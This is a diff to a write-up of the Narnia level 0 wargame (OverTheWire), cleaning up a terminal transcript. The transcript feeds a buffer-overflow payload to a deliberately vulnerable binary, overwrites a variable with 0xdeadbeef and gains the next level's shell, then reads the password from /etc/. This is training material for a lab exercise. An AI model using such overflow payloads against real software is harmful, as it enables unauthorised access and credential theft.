@@ -101,18 +101,12 @@ efeidiedae       # password for narnia1
 Alternatively, print the string, and copy & paste it to get the the narnia1 shell and grab the password from /etc/ manually.
 
 ```bash
-narnia0@narnia:/narnia$ (echo -e 'AAAAAAAAAAAAAAAAAAAA\xef\xbe\xad\xde\xaf';cat)                           AAAAAAAAAAAAAAAAAAAAﾭޯ
+narnia0@narnia:/narnia$ (echo -e 'AAAAAAAAAAAAAAAAAAAA\xef\xbe\xad\xde\xaf';cat)
+AAAAAAAAAAAAAAAAAAAAﾭޯ
 
 narnia0@narnia:/narnia$ ./narnia0
 Correct val's value from 0x41414141 -> 0xdeadbeef!
-Here is your chance: (echo -e 'AAAAAAAAAAAAAAAAAAAA\xef\xbe\xad\xde\xaf';cat)
-
-buf: (echo
-val: 0x41414141
-WAY OFF!!!!
-narnia0@narnia:/narnia$                                                                                               narnia0@narnia:/narnia$ ./narnia0
-Correct val's value from 0x41414141 -> 0xdeadbeef!
-Here is your chance: AAAAAAAAAAAAAAAAAAAAﾭޯ
+Here is your chance: AAAAAAAAAAAAAAAAAAAAﾭޯ 
 buf: AAAAAAAAAAAAAAAAAAAAﾭ
 val: 0xdeadbeef
 $ whoami
